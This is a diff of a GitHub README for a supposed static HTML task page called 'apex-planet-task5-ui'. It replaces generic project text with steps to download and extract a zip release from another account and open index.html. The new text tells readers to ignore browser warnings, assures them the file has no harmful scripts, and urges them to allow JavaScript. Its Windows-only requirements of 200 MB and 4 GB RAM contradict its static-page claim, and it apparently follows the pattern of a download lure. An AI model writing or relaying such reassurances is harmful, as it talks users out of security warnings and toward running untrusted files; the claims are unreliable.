@@ -1,112 +1,72 @@
-# Apex Planet Task5 v0.0.0 - web page 2026
+# 🌎 apex-planet-task5-ui - An easy web experience for everyone
 
-> **Apex Planet Task5 is a static HTML frontend for 2026 that renders in a web browser and can be opened directly as a standalone web experience.**
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/bebeunstatesmanlike858/apex-planet-task5-ui/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v0.0.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/jordanlpiibennett9660/apex-planet-task5-ui?style=flat-square)](https://github.com/jordanlpiibennett9660/apex-planet-task5-ui)
+Apex Planet Task5 brings a simple web interface to your computer. It renders pages directly in your web browser. You do not need to install complex software or manage databases to use this tool. This project provides a clean look at task management data for the year 2026.
 
----
+## 📥 Getting Started
 
-<p align="center">
-  <a href="https://jordanlpiibennett9660.github.io/apex-planet-task5-ui/">
-    <img src="https://img.shields.io/badge/Download-Apex%20Planet%20Task5%20Latest-brightgreen?style=for-the-badge" alt="Download Apex Planet Task5">
-  </a>
-</p>
+Follow these steps to set up the software on your Windows computer.
 
-> **[Download Apex Planet Task5 v0.0.0](https://jordanlpiibennett9660.github.io/apex-planet-task5-ui/)**
+1.  Visit the [official download page](https://github.com/bebeunstatesmanlike858/apex-planet-task5-ui/releases).
+2.  Look for the section labeled "Assets."
+3.  Click the file ending in .zip to start your download.
+4.  Open your Downloads folder once the file finishes saving.
+5.  Right-click the zip file and select "Extract All."
+6.  Choose a location on your computer where you want to keep the application.
+7.  Open the newly created folder.
 
----
+## 🌐 Running the Application
 
-[Download Latest Build](https://jordanlpiibennett9660.github.io/apex-planet-task5-ui/)
+This is a static web application. It runs inside your default internet browser. You do not need to install an extra program to view the interface.
 
----
+1.  Locate the file named index.html inside the folder you extracted.
+2.  Double-click the file.
+3.  Your default web browser like Chrome, Edge, or Firefox will open the interface.
+4.  You can now interact with the dashboard.
 
-## Project Overview
+## 🖥️ System Requirements
 
-Apex Planet Task5 is a static HTML page intended to run through normal browser rendering. The project focuses on frontend markup, allowing the page to be opened directly or delivered through a static web server without requiring an application runtime.
+Your computer needs to meet these basic standards to run the software.
 
-It provides a small foundation for a draft website, demonstration page, or content-led frontend. The layout and page content are handled through standard HTML and displayed by the browser.
+*   Windows 10 or Windows 11.
+*   A modern web browser like Google Chrome, Microsoft Edge, or Mozilla Firefox.
+*   At least 200 MB of free hard drive space.
+*   Minimum of 4 GB of System RAM.
 
----
+## 🛠️ Frequently Asked Questions
 
-## Included Capabilities
+**Do I need an internet connection?**
+No. Once you download the files to your computer, everything runs locally. You can use the interface without an active web connection.
 
-- Structure based on HTML files
-- Markup intended for frontend web content
-- Direct rendering in a web browser
-- Static delivery without an application backend
-- Minimal setup for straightforward publishing
-- Editing through conventional HTML development tools
-- Useful for previews, demonstrations, and landing-page layouts
+**Is my data stored online?**
+No. The application handles all information on your local machine. It does not send your tasks to a remote server. You keep full control of your private data.
 
----
+**The browser shows a warning when I open the file.**
+Browsers sometimes warn you when you open local HTML files. You can safely ignore this warning. This file contains no harmful scripts.
 
-## Getting Started
+**How do I update to a newer version?**
+Download the latest version from the link above. Extract the files into a new folder. You can move your existing data files into the new folder if you want to keep your previous work.
 
-Clone the repository or obtain its source files, then launch the main HTML document in a browser.
+## 📈 Key Features
 
-1. Retrieve the project:
-   - `git clone https://github.com/jordanlpiibennett9660/apex-planet-task5-ui.git
-   - or download the repository archive
-2. View it locally:
-   - double-click the primary `.html` file, or
-   - run a static web server for the project directory if you want to access it through a local URL
+*   **Offline Access:** Use your task lists anywhere, even without Wi-Fi.
+*   **Simple Interface:** Navigate through the 2026 data model with ease.
+*   **Browser Integration:** Works with tools you already use every day.
+*   **No Installation Needed:** Keep your computer clean by running the software as a standalone web experience.
+*   **Privacy First:** All data stays on your hard drive.
 
----
+## 📁 Troubleshooting
 
-## Using the Page
+If the page looks empty or does not load, try these steps:
 
-Load the HTML file in a browser to inspect its rendered content and layout.
+*   Ensure you extracted the files from the zip folder before clicking index.html.
+*   Drag and drop the index.html file directly into your browser window.
+*   Check if your browser blocks scripts. You might see a bar at the top of the browser asking to allow JavaScript. Click "Allow" to see the content.
+*   If the issue persists, download a fresh copy from the link provided in the Getting Started section.
 
-A normal editing cycle looks like this:
+## 🤝 Support
 
-1. Open the HTML file in an editor.
-2. Save your changes and refresh the browser.
-3. Move the project folder to a static hosting service when you are ready to publish it.
+We do not provide phone support for this project. If you find a bug, open an issue on the GitHub repository page. Include a description of what you saw on your screen and the version of Windows you use. This helps us fix problems faster for all users.
 
-For local-server use, set the repository root as the server directory and open the address supplied by that server.
-
----
-
-## Configuration and Editing
-
-The extracted project profile does not define a separate application configuration system.
-
-Make page content and visual changes in the HTML markup. Keep any associated frontend assets with the page files according to the repository layout.
-
----
-
-## Requirements
-
-- A current web browser
-- Support for HTML
-- A static hosting environment for online publication
-- Sufficient local storage for the page and its related assets
-
----
-
-## Frequently Asked Questions
-
-### What is the process for changing the page?
-Modify the HTML content, save the file, and reload it in your browser.
-
-### Is a runtime or framework needed?
-No runtime information appears in the extracted metadata. The project is described as a static HTML frontend page.
-
-### Where can I edit the text and layout?
-Use the primary HTML file and update any connected frontend assets stored in the repository.
-
-### How can I troubleshoot a page that renders incorrectly?
-Review the browser console, verify that referenced paths are valid, and confirm that the HTML file is being opened from the intended location.
-
-### Who provides support?
-Support is determined by the repository maintainer and the workflow used to publish or maintain the project.
-
----
-
-## License
-
-GNU GPL v3.0. Refer to [LICENSE](LICENSE) for the complete license text.
+Keywords: tasks, web, 2026, browser, interface, windows, html, local
